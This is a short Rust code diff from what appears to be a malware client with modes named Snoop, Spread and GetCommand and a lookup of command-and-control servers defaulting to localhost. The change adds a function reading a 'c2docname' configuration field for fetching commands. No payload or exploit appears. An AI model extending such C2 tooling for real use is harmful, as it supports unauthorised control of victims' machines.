@@ -107,7 +107,7 @@ fn main() {
             Modes::Snoop => snoop(),
             Modes::Spread => spread(),
             Modes::DumpConfig => dumpconf(&conf),
-            Modes::GetCommand => get_commands(get_c2s(&conf)),
+            Modes::GetCommand => get_commands(get_c2s(&conf), get_docname(&conf)),
             // _ => unreachable!(), // panics if code becomes not unreachable
         }
     } else {
@@ -190,5 +190,13 @@ fn get_c2s(conf: &Option<Config>) -> Vec<String> {
         // empty
         warn!("no c2s found, sensible defaults provided");
         vec![String::from("localhost:8888"), String::from("localhost:80")]
+    }
+}
+
+fn get_docname(conf: &Option<Config>) -> String {
+    if let Some(docname) = get_field("c2docname", conf) {
+        docname
+    } else {
+        String::from("./conf.json")
     }
 }
